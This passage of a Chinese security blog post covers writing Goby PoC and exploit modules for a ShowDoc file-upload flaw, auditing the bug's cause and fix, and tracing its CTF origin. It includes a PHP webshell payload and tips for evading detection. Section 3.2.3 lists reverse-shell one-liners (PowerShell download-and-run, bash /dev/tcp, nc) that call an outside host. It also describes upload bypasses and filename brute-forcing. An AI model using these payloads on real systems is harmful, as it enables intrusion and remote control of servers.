src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%206.png"></p><h3 id="2-3-2-提高POC的准确性"><a href="#2-3-2-提高POC的准确性" class="headerlink" title="2.3.2 提高POC的准确性"></a>2.3.2 提高POC的准确性</h3><p><strong>问题</strong>：既然可以发出第二次请求，不仅可以触发<code>unlink()</code>函数，是否可以考虑增加一些<code>echo</code>操作进一步提高POC的准确性？</p><p><strong>思路：</strong>在php文件中echo一段随机数，然后第二次请求在响应判断的时候，不仅只是判断响应为200，也匹配是否这段随机数？</p><p>问题解决了，步骤自然清晰。虽然第一次返回匹配到success等字段即可验证POC成功，第二步echo再一下有些多余，但是我想以后肯定某个地方需要用的，先学着。</p><p><strong>已知问题</strong>：由于目前Goby GUI并不支持随机数，所以只能手动输入一个固定数然后进行判断。(Goby团队后续会在GUI中增加随机数选项)</p><h3 id="2-3-3-优化一句话木马"><a href="#2-3-3-优化一句话木马" class="headerlink" title="2.3.3 优化一句话木马"></a>2.3.3 优化一句话木马</h3><p><strong>新需求</strong>：上传冰蝎类的马简单，上传一句话木马类似，但是之前的方式需要在浏览器或冰蝎中打开链接进行操作，有些繁琐。针对一句话木马如果只想在GobyGUI中操作，不需要新打开浏览器中转，肯定更优雅更简洁，那么如何操作？</p><p><strong>需求拆解</strong>：实现动态一句话木马：①在木马文件中动态插入一句话命令②触发木马文件并获取返回值</p><p><strong>问题</strong>：</p><ol><li>如何在上传文件中动态插入参数？查看文档后发现：Goby提供<code>ExpParams</code> 字段来让用户自定义所需传递参数，且和自定义参数逻辑一样，<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>包裹即可在json任意位置使用该变量，比如<code>&lt;?php system(&quot;&#123;&#123;&#123;cmd&#125;&#125;&#125;&quot;);unlink(); ?&gt;</code>,即可实现一句话木马的操作</li><li>如何触发木马并返回值？和前面类似，发送二次请求即可</li></ol><p>Trick：</p><ol><li>Goby发包逻辑是每次先POC后EXP，更改EXP后又要重新走一遍扫描流程，很麻烦，有其他直接验证EXP的操作吗？Goby-cmd.exe脚手架中不仅提供scan操作，也提供exploit操作，且exploit操作支持<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数。</li><li>输入命令<code>goby-cmd -mode runpoc -operation exploit -pocFile exploits\user\a.go -target 127.0.0.1 -params &quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可直接验证EXP。</li><li>在cmd模式下验证EXP无误，切换到GUI界面进行扫描，EXP验证成功！</li></ol><p>已知BUG：</p><ol><li>发包BUG：在json编写EXP需要连续发两个包的情况下，即使内容编写正确的情况下依然可能会检测失败。需要在ExploitSteps的第一个请求的<code>SetVariable</code> 键中额外加入<code>&quot;output|lastbody&quot;</code>值，才会成功执行第二个请求，进而检测成功。（前面《2.3.1 自动删除上传文件》部分用的仅仅只有POC，没用到EXP这一步，所以未产生BUG）</li><li>系统差异BUG：windows下cmd中使用<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数会报错<code>invalid character &#39;\&#39;&#39; looking for beginning of value</code> ，改为<code>&quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%207.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%208.png"></p><h1 id="3-用Go语言编写Goby的POC"><a href="#3-用Go语言编写Goby的POC" class="headerlink" title="3. 用Go语言编写Goby的POC"></a>3. 用Go语言编写Goby的POC</h1><h2 id="3-1-迈出第一步：学用Go语言"><a href="#3-1-迈出第一步：学用Go语言" class="headerlink" title="3.1 迈出第一步：学用Go语言"></a>3.1 迈出第一步：学用Go语言</h2><p>使用GUI时遇到的痛点</p><ol><li>部分功能缺失：无法使用随机数</li><li>缺少DIY需求：对于返回的<code>\/Public\/Uploads\/2021-06-24\/</code> 这类链接无法直接使用，需要手动剔除转移符号</li><li>黑盒的未知性：单纯看Json并不能掌控POC后续是怎么被载入和利用的，没有Go代码看起来的直观可控</li><li>BUG：不少BUG是因为Json中缺少某个键值，但是判断又很难判断，而Go代码更加可控。</li></ol><p><strong>困难：</strong></p><ol><li>上述Poc难吗？不难，不过是发出请求罢了。</li><li>不会Go语言怎么办？只是发出一个请求罢了，官方也提供了code demo，只需要改下URI即可完成轮子搭建。详见<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#golang-%E4%BB%A3%E7%A0%81%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C">Goby《Vulnerability-writing-guide》之golang-代码录入漏洞手册</a></li></ol><p>虽然我不会Go，但是因为上面的痛点，还是想克服困难，迈出那第一步。</p><p><strong>思路：</strong></p><ol><li>化繁为简：先写POC，POC写好了，EXP自然写好了。</li><li>根据官方的demo，改下POC中的Uri，改下匹配的关键字</li><li>测试即可</li></ol><p>具体不表，造轮子而已。</p><h2 id="3-2-进一步：优化POC"><a href="#3-2-进一步：优化POC" class="headerlink" title="3.2 进一步：优化POC"></a>3.2 进一步：优化POC</h2><h3 id="3-2-1-用Go语言实现高级需求"><a href="#3-2-1-用Go语言实现高级需求" class="headerlink" title="3.2.1 用Go语言实现高级需求"></a>3.2.1 用Go语言实现高级需求</h3><p>刚才只是简单的request，想要完成更高的需求，比如前面Json部分对POC的优化</p><p><strong>问题</strong>：</p><ol><li>Go如何实现两次请求达到删除的效果？把发出请求的代码Copy一次，if第一次成功，发出第二次请求，if第二次请求成功，return true。</li><li>Go如何使用正则？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>regexp.MustCompile()</code> ，百度搜用法，先新建regex.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何拼接变量？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>fmt.Sprintf(&quot;%s&quot;,var）</code> ，百度搜用法，先新建fmt.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何实现随机数？因为前面GUI编写只能固定数，存在被检测特征，仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#goutils">官方文档</a> ，发现其使用<code>RandomHexString()</code>生成随机字符串，将固定数替换为随机数变量即可</li><li>Go能否将冰蝎上传后返回链接自动优化，而不是手动删除转义符号？既然我们可以通过拼接<code>date</code>和<code>file</code> 形成第二次请求的链接，那么我们也可以冰蝎的输出的内容改为这个链接：<code>expResult.Output =fmt.Sprintf(&quot;%s/Public/Uploads/%s/%s&quot;, expResult.HostInfo, date[1], file[1])</code> </li><li>Go能否进一步减少POC特征？前面提及不少网上木马的key为<code>peiqi</code> ,此处也可以利用<code>RandomHexString()</code> 的方式随机生成key，然后在第二次使用后删除该文件，实现一次一密的效果。当然<code>boundary=-------xxxxx</code> 字段也可以通过<code>RandomHexString()</code> 来实现随机性。</li></ol><p>一步步的查看文档、测试，发现Go语言编写POC&amp;EXP时，内容和行为更可控，也能实现更多自定义需求，需要的Go语言基础也不高，个人觉得比目前GUI的Json编写更加方便。（后续Goby团队会改进GUI并实现这些需要用Go才能满足需求）</p><h3 id="3-2-2-执行一句话命令"><a href="#3-2-2-执行一句话命令" class="headerlink" title="3.2.2 执行一句话命令"></a>3.2.2 执行一句话命令</h3><p>Goby红队版本就是执行一句话回显命令的方式</p><p><strong>问题：</strong></p><ol><li>Goby如何自定义参数？前面已经介绍了，在Json中的<code>ExpParams</code> 字段来让用户自定义所需传递参数</li><li>Go中如何获取到自定义参数?查看文档发现，可以使用<code>ss.Params[&quot;cmd&quot;].(string)</code>的形式获取参数</li><li>Go中如何将自定义参数输入到payload中？利用前面提及的<code>fmt.Sprintf(&quot;%s&quot;,var）</code> 方式</li></ol><h3 id="3-2-3-更进一步：直接反弹shell"><a href="#3-2-3-更进一步：直接反弹shell" class="headerlink" title="3.2.3 更进一步：直接反弹shell"></a>3.2.3 更进一步：直接反弹shell</h3><p><strong>想法</strong>：既然可以一句话木马，而大部分时间我们生成一句话木马之后第二步就是反弹shell，那么为什么第二次不直接执行反弹shell，难道不比执行一句话命令好？</p><p><strong>问题</strong>：</p><ol><li>如何实现（思路上）？将一句话木马的paylod部分由自定义参数命令的方式直接改为反弹shell的命令即可</li><li>如何实现（实际操作）？查看Goby提供<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-goby-%E7%9A%84-godserver-%E5%8F%8D%E5%BC%B9-shell">反弹shell的demo</a> 文档，然后魔改为自己需要的即可</li><li>为什么可以反弹shell，但是所上传文件无法自动删除，<code>unlink()</code> 函数没触发？因为先执行命令再执行<code>unlink()</code>函数，而前者shell在反弹过程中堵塞了进程，百度后发现可<a href="https://www.php.net/manual/en/function.exec.php#86329">采取<code>popen()</code>启动子进程</a>的方式。(有趣的是，通过该文档，我了解到可以通过<code>php_uname()</code> 来判断服务器主机系统，进而根据不同系统动态生成payload的操作)（GobyShell只有10分钟存活，也可以保证不会长期驻留服务器进程）</li></ol><p>我先在本地测试PHP载荷可以实现反弹shell的效果(详见下图)，然后再在Go语言中实现。</p><blockquote><p>和go0p师傅交流之后，我发现我的想法是错的：我急于直接看到反弹shell的效果，只是因为我的测试环境允许。在实战情况下，目标可能不出网，Godserver服务器可能有一定的问题等等，导致反弹shell不一定在所有环境下都是可以成功的，所以EXP能使用一句话木马回显就用一句话木马回显，其次才考虑其他验证方式。参考<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AE%AE">《GobyPOC编写建议之其他建议》</a></p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//Goby生成的godserver相关命令</span><br><span class="hljs-comment">//ReverseTCPByPowershell</span><br>powershell IEX (New-<span class="hljs-built_in">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://godserver.tk/ps/rs.ps1&#x27;</span>);rs -H godserver.tk -P <span class="hljs-number">35355</span><br><span class="hljs-comment">//ReverseTCPByBash</span><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-comment">//ReverseTCPByNcBsd</span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc godserver.tk <span class="hljs-number">35355</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br><span class="hljs-comment">//ReverseTCPBySh</span><br><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span>-;exec <span class="hljs-number">1</span>&lt;&gt;<span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span>;sh -i &lt;&amp;<span class="hljs-number">1</span> &gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2010.png"></p><h2 id="3-3-最终效果"><a href="#3-3-最终效果" class="headerlink" title="3.3 最终效果"></a>3.3 最终效果</h2><p>代码放在仓库：<a href="https://github.com/corp0ra1/showDocDemo">https://github.com/corp0ra1/showDocDemo</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.gif"></p><h2 id="3-4-发散思维"><a href="#3-4-发散思维" class="headerlink" title="3.4 发散思维"></a>3.4 发散思维</h2><p>上述操作基本把Goby提供的功能基本都尝试了个遍，就剩下个DNSLOG也尝试一下？比如第二次请求之后不通过返回值判断而是根据DNSLOG的结果？</p><h1 id="4-更进一步-代码审计-TL-DR"><a href="#4-更进一步-代码审计-TL-DR" class="headerlink" title="4. 更进一步-代码审计 TL;DR"></a>4. 更进一步-代码审计 TL;DR</h1><p>上述操作只是完成了漏洞的复现，以及POC&amp;EXP的编写，但是心中还是有疑问</p><ul><li>为什么文件名后缀使用<code>.&lt;&gt;php</code>就可以绕过?</li><li>为什么我尝试<code>.&lt;php</code>的后缀绕过方式不行？</li><li>为什么有这种神奇的绕过方法？</li><li>什么原因导致的？</li></ul><p>十万个为什么，最终促使了我进行代码审计！</p><blockquote><p>不会代码审计，只能一步步的断点跟踪分析，笨办法</p></blockquote><h2 id="4-1-showdoc如何限制文件上传的"><a href="#4-1-showdoc如何限制文件上传的" class="headerlink" title="4.1 showdoc如何限制文件上传的"></a>4.1 showdoc如何限制文件上传的</h2><h3 id="4-1-1-先黑名单检测"><a href="#4-1-1-先黑名单检测" class="headerlink" title="4.1.1 先黑名单检测"></a>4.1.1 先黑名单检测</h3><p>检测文件名中是否包含php字样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2011.png"></p><h3 id="4-1-2-再白名单检测"><a href="#4-1-2-再白名单检测" class="headerlink" title="4.1.2 再白名单检测"></a>4.1.2 再白名单检测</h3><p>检测文件后缀名是否在upload类的<code>$ext</code>数组白名单中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;exts&#x27;</span>]) ? <span class="hljs-literal">true</span> : in_array(strtolower(<span class="hljs-variable">$ext</span>), <span class="hljs-keyword">$this</span>-&gt;exts);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2012.png"></p><h3 id="4-1-3-最后图片内容检测"><a href="#4-1-3-最后图片内容检测" class="headerlink" title="4.1.3 最后图片内容检测"></a>4.1.3 最后图片内容检测</h3><p>仅对图像文件进行进一步检测，其他类型则放行（有些鸡肋）</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2013.png"></p><h2 id="4-2-绕过方法一：畸形后缀绕过"><a href="#4-2-绕过方法一：畸形后缀绕过" class="headerlink" title="4.2 绕过方法一：畸形后缀绕过"></a>4.2 绕过方法一：畸形后缀绕过</h2><h3 id="4-2-1-绕过方式"><a href="#4-2-1-绕过方式" class="headerlink" title="4.2.1 绕过方式"></a>4.2.1 绕过方式</h3><p>文件名为：<code>test.&lt;&gt;php</code></p><h3 id="4-2-2-原理"><a href="#4-2-2-原理" class="headerlink" title="4.2.2 原理"></a>4.2.2 原理</h3><p><code>.&lt;&gt;php</code>的方式绕过了黑名单对<code>.php</code>检测</p><p>而在之后的showdoc\server\ThinkPHP\Library\Think\Upload.class.php 的<code>upload()</code>函数中对文件名使用了<code>strip_tags()</code>函数进行处理，去掉了<code>&lt;&gt;</code>标签，还原后缀名为php。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2014.png"></p><h3 id="4-2-3-修复方案"><a href="#4-2-3-修复方案" class="headerlink" title="4.2.3 修复方案"></a>4.2.3 修复方案</h3><p>在进行黑名单检测时，先用<code>strip_tags()</code>函数对输入文件名进行处理（有趣的是我在另外一个路径下的同名文件中发现了这种修复方案）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//漏洞版本：showdoc\server\Application\Home\Controller\PageController.class.php</span><br><br>strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br><br><span class="hljs-comment">//另外一个路径下的修复版本：showdoc\server\Application\Api\Controller\PageController.class.php</span><br><br>strstr(strip_tags(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])), <span class="hljs-string">&quot;.php&quot;</span>) <br></code></pre></td></tr></table></figure><h3 id="4-2-4-追问：不是后面还会进行白名单检测吗？"><a href="#4-2-4-追问：不是后面还会进行白名单检测吗？" class="headerlink" title="4.2.4 追问：不是后面还会进行白名单检测吗？"></a>4.2.4 追问：不是后面还会进行白名单检测吗？</h3><blockquote><p>重头戏，这个引发后续一系列问题！</p></blockquote><p>虽然前面绕过了黑名单检测，但是后面还有白名单检测，那么这里怎么绕过的呢？</p><p>赋值问题：后缀的白名单数组赋值给了upload类中的<code>allowExts</code>变量：<code>$upload-&gt;allowExts = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> ，但是检测文件名后缀的时候使用upload类中的<code>exts</code>变量：<code>$this-&gt;config[&#39;exts&#39;]</code> ，错付了值，显而易见，exts变量为空，故绕过了后缀名的check。</p><p>这是开发者在开发时疏漏导致的白名单检测缺陷，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code> 即可修复</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2015.png"></p><h2 id="4-3-绕过方法二：修改输入名称"><a href="#4-3-绕过方法二：修改输入名称" class="headerlink" title="4.3 绕过方法二：修改输入名称"></a>4.3 绕过方法二：修改输入名称</h2><h3 id="4-3-1-绕过方式"><a href="#4-3-1-绕过方式" class="headerlink" title="4.3.1 绕过方式"></a>4.3.1 绕过方式</h3><p>将文件输入名称改为<code>editormd-image-file1</code>，如  <code>name=&quot;editormd-image-file1&quot;; filename=&quot;test.php&quot;</code> </p><h3 id="4-3-2-原理"><a href="#4-3-2-原理" class="headerlink" title="4.3.2 原理"></a>4.3.2 原理</h3><p>因为他只检测输入名为<code>editormd-image-file</code> 文件的文件名是否包含php，修改对应的输入名即可。通过此方式同样绕过了黑名单的检测，结合白名单的缺陷，以实现目的</p><p><strong>举一反三</strong>：这也解释了为什么其他场景的文件上传中可以通过修改这个字段名称的方式绕过了文件上传限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="4-3-3-缺陷"><a href="#4-3-3-缺陷" class="headerlink" title="4.3.3 缺陷"></a>4.3.3 缺陷</h3><p>虽然在文件夹中看到文件成功上传，但是返回的文件路径中没有文件名</p><p>查看源码后发现：是因为在返回的文件名中又一次使用到了<code>editormd-image-file</code> ，并通过这个名来获取文件保存路径。由于我们更改了输入名，并不存在<code>editormd-image-file</code> 的键值，故返回了文件名为空。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2016.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2017.png"></p><h3 id="4-3-4-进一步绕过"><a href="#4-3-4-进一步绕过" class="headerlink" title="4.3.4 进一步绕过"></a>4.3.4 进一步绕过</h3><p>虽然没有返回文件名，但是文件是上传成功的，那么如何知道上传后的文件名？</p><p>跟踪源码，发现文件命名调用了<code>uniqid()</code> 函数，而该函数的定义是基于以微秒计的当前时间，生成一个唯一的 ID。根据函数的定义，那么在极短的时间内发送两个包，那么文件名应该是相近的。</p><p>方法一：第一个正常上传返回路径，第二个修改输入名不返回路径，依据时间递增遍历即可找到，但是爆破不知上限有些盲目。</p><p>方法二：php文件在两个包之间，对应文件名也在两个包时间之间。如下图，需要爆破5位数</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2018.png"></p><h3 id="4-3-5-更进一步"><a href="#4-3-5-更进一步" class="headerlink" title="4.3.5 更进一步"></a>4.3.5 更进一步</h3><p>通过查看<a href="http://document.thinkphp.cn/manual_3_2.html#upload">thinkphp文档</a>后发现，其支持多文件上传。测试后多文件上传后，发现文件处理时间间隔更近，命名更相似，3位数，对应爆破次数不超过4000次，效率更高。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2019.png"></p><h2 id="4-4-官方修复方案"><a href="#4-4-官方修复方案" class="headerlink" title="4.4 官方修复方案"></a>4.4 官方修复方案</h2><p>修复白名单赋值导致的缺陷即可，将<code>$upload-&gt;allowExts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code>对应代码更改为<code>$upload-&gt;exts= array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);</code></p><p><a href="https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd">https://github.com/star7th/showdoc/commit/189b6cedc011a0d2758f4207cb85c565372093dd</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2020.png"></p><h2 id="4-5-其他失败尝试"><a href="#4-5-其他失败尝试" class="headerlink" title="4.5 其他失败尝试"></a>4.5 其他失败尝试</h2><h3 id="4-5-1-直接上传php"><a href="#4-5-1-直接上传php" class="headerlink" title="4.5.1 直接上传php"></a>4.5.1 直接上传php</h3><p><strong>原因</strong>：最早跟踪&lt;&gt;的漏洞成因，发现是白名单后缀检测失效导致的，既然白名单失效，为什么不考虑直接上传php</p><p><strong>过程</strong>：测试失败，然后下断点跟踪代码。</p><p><strong>收获</strong>：发现了其还有一层黑名单验证机制</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2021.png"></p><h3 id="4-5-2-strlower通过Unicode字符绕过"><a href="#4-5-2-strlower通过Unicode字符绕过" class="headerlink" title="4.5.2 strlower通过Unicode字符绕过"></a>4.5.2 strlower通过Unicode字符绕过</h3><p>原因：最近打<a href="https://blog.csdn.net/wanmiqi/article/details/117044715">CISCN2021</a>的一道upload题目，遇到在<code>strtolower</code> 进行黑名单匹配时可通过unicode绕过</p><p><strong>过程</strong>：仔细查看后发现我记错了，CTF中题目是<code>mb_strtolowe</code>r，而此处是<code>strtolower</code></p><p><strong>收获</strong>：对<code>strtolower</code>和<code>mb_strtolower</code>理解更深</p><h3 id="4-5-3-htaccess绕过"><a href="#4-5-3-htaccess绕过" class="headerlink" title="4.5.3 .htaccess绕过"></a>4.5.3 .htaccess绕过</h3><p><strong>背景</strong>：黑名单只限制php，phtml可以上传，但无法被解析，那么可以上传<code>.htaccess</code>使之支持解析吗？</p><p><strong>过程</strong>：测试，发现上传的<code>.htaccess</code> 会被重命名为<code>60d150f6ee711.htaccess</code></p><p><strong>结局</strong>：不再发散，点到为止</p><h1 id="5-有趣的溯源"><a href="#5-有趣的溯源" class="headerlink" title="5. 有趣的溯源"></a>5. 有趣的溯源</h1><h2 id="5-1-漏洞起源于CTF"><a href="#5-1-漏洞起源于CTF" class="headerlink" title="5.1 漏洞起源于CTF"></a>5.1 漏洞起源于CTF</h2><ol><li>plzmyy师傅最早通报这个漏洞给<a href="https://github.com/star7th/showdoc/pull/1059%E3%80%82">showdoc官方</a>在2020年的八月</li><li>plzmyy师傅提到了最早出现在RoarCTF2019的赛事中的simple_upload题目<a href="https://www.fuzzer.xyz/2019/10/14/RoarCTF2019">Ethan师傅的WP</a></li><li>Ethan师傅发现&lt;&gt;绕过方法是fuzz出来这个非预期解，而查看绝大部分WP以及<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/simple_upload/writeup">疑似官方的WP</a>中介绍的是利用uniqid()的函数可爆破的点，似乎没注意到这个非预期解。</li><li>Ethan师傅文章中提到疑似0day，引起了我的兴趣，我想分析到底是哪个day？</li></ol><h2 id="5-2-疑似0day"><a href="#5-2-疑似0day" class="headerlink" title="5.2 疑似0day"></a>5.2 疑似0day</h2><ol><li>检索相关关键词，没有发现0day，而且到现在都没有爆出来，离谱！更加吸引了我的兴趣</li><li>搜索引擎限定搜索时间为19年10月RoarCTF开赛之前，发现一个14的<a href="https://www.jb51.net/article/54209.htm">《ThinkPHP文件上传实例教程》</a>一个15年的<a href="http://www.splaybow.com/post/thinkphp-file-upload-sample.html">《ThinkPHP文件上传的实例代码》</a>网页介绍了如何使用ThinkPHP文件上传 ，其使用的方法就是<code>$upload-&gt;allowExts</code>错误的写法，而ThinkPHP官方3.2版本的<a 